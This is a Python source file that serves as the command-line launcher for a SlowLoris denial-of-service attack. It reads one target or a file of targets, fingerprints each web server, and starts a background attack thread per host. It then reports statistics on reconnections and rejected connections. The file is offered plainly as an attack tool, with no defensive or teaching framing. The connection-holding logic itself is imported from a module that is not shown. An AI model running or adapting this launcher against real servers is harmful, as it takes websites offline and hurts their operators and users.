"""This module implements the SlowLoris DoS attack."""

# Standard imports
import re
import threading
import time
import argparse

# Library imports
from slow_loris import LorisClient, TargetInfo, try_detect_webserver

# Constants
DEFAULT_PORT = 80
DEFAULT_CONNECTION_COUNT = 200

def parse_target(target):
    """Parses a target."""
    pat = re.compile(r"(?P<host>(?:\w|\.)+)(\:(?P<port>\d+))?")
    mat = pat.match(target)
    host, port = (mat.group("host"), mat.group("port"))
    port = 80 if port is None else int(port)
    ssl = port == 443
    print("Host: {}; Port: {}".format(host, port))
    return TargetInfo(host, port, ssl)

def parse_target_file(path):
    """Parses a target file."""
    with open(path) as file:
        return [parse_target(line.strip()) for line in file.readlines()]

def main():
    """The main entry point."""
    # Parse arguments
    parser = argparse.ArgumentParser(description="Launch a SlowLoris attack.")
    parser.add_argument("target",
                        type=str,
                        help="the target of the attack",
                        nargs="?")
    parser.add_argument("-f", "--file",
                        type=str,
                        dest="target_file",
                        metavar="target_file",
                        help="load targets from file")
    parser.add_argument("--ssl",
                        dest="force_ssl",
                        action="store_true",
                        help="force SSL connection")
    parser.set_defaults(force_ssl=False)
    args = parser.parse_args()
    # Validate arguments
    if args.target is None and args.target_file is None:
        print("Error! Expected either a target or a target file.")
        parser.print_help()
        exit()
    elif args.target is not None and args.target_file is not None:
        print("Error! Expected either a target or a target file, not both.")
        parser.print_help()
        exit()
    targets = []
    if args.target is not None:
        targets.append(parse_target(args.target))
    else:
        targets = parse_target_file(args.target_file)
    # Start the attack(s)
    print("Press Ctrl+C to stop all attacks instantly.")
    print("The servers will be up again as soon as the attacks stop.")
    try:
        loris = LorisClient()
        # Iterate over all targets
        for target in targets:
            # Force SSL if ssl command-line switch is present
            target.ssl = True if args.force_ssl else target.ssl
            # Try detecting the webserver running on the host
            web_server = try_detect_webserver(target)
            if web_server != None:
                if web_server.startswith("Apache"):
                    print("[{}] Server is running Apache.".format(target.host))
                else:
                    print("[{}] Server is running {}.".format(target.host, web_server))
            # Spawn the attacking thread
            attack_thread = threading.Thread(
                target=loris.attack,
                args=[target])
            attack_thread.daemon = True
            attack_thread.start()
            time.sleep(0.5)
        while True:
            pass
    except (KeyboardInterrupt, SystemExit):
        loris.stop()
        for target in targets:
            print("Statistics for {}:".format(target.host))
            print("- Reconnections: {}".format(target.reconnections))
            print("- Dropped connections: {}".format(target.dropped_connections))
            print("- Rejected connections: {}".format(target.rejected_connections))
            print("- Rejected initial connections: {}".format(target.rejected_initial_connections))
        exit()

if __name__ == "__main__":
    main()
